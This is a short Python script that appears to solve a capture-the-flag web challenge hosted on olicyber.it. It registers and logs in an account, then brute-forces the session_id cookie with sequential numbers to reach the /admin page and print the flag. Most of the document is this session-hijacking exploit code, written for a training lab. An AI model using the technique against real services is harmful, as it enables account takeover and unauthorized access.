import requests
import json

import random
import string

from pwn import *

def generate_string(n):
    # Genera una stringa casuale di lunghezza n
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


url = "http://too-small-reminder.challs.olicyber.it"

payload = "/admin"

register = "/register"

login = "/login"

logout = "/logout"

data = {
    "username": generate_string(20),
    "password": "a"
}

headers = {
    'Content-Type': 'application/json'
}


jsonPayload = json.dumps(data)

l = log.progress("Bruteforcing")

#{"Endpoints":[{"descrizione":"Accetta richieste GET. Restituisce questa piccola descrizione dell'API.","percorso":"/"},
#{"descrizione":"Accetta richieste POST contenenti un JSON con i seguenti campi: 'username', 'password'. "
#"Permette di creare un nuovo account utente.","percorso":"/register"},
#  {"descrizione":"Accetta richieste POST contenenti un JSON con i seguenti campi: 'username', 'password'. In caso di successo, "
# "ritorna il cookie di sessione assegnato.","percorso":"/login"},{"descrizione":"Accetta richieste GET contenenti un cookie "
#     "di sessione valido. Distrugge la sessione.",
#         "percorso":"/logout"},
#               {"descrizione":"Accetta richieste GET contenenti un cookie di sessione valido","percorso":"/admin"}]}

# Registrazione dell'account
for i in range (0, 5000):
    data = {
        "username": generate_string(20),
        "password": "a"
    }
    s = requests.Session()
    r = s.post(url + register, headers=headers, data=jsonPayload)
    r = s.post(url + login, headers=headers, data=jsonPayload)
    s.cookies['session_id'] = str(i)
    r = s.get(url + payload)
    l.status(str(i))
    if "flag" in r.text: #338
        print(r.text)
        break



